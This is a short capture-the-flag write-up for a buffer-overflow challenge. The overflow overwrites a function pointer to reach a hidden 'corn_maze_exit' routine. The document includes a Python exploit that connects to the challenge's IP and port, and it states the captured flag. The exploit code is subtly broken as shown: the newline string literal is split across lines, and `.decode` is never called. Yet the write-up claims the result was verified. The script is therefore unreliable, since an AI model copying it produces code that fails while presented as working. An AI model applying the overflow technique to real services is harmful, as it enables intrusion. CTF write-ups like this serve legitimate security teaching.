# Cyberphobia: Overflowed Bits

**Category:** pwn | **Flag:** `spooky{br4v3Se@O77er}`

## Approach
Provided `main.c` showed `struct { char buf[64]; void (*directions); }`. A 64-byte buffer followed by a function pointer. Overflowing the buffer overwrites the pointer; redirect it to `corn_maze_exit`, which prints the secret. Remote service at 18.226.103.146:1337.

## Reproduction
```python
import socket, struct
addr = 0x4011d6 # corn_maze_exit
payload = b"A"*64 + struct.pack("<Q", addr)
s = socket.create_connection(("18.226.103.146", 1337))
s.recv(4096)
s.sendall(payload + b"
")
print(s.recv(4096).decode)
```
Server returned: `Secret value: br4v3Se@O77er` → flag `spooky{br4v3Se@O77er}`. Verified server-side.
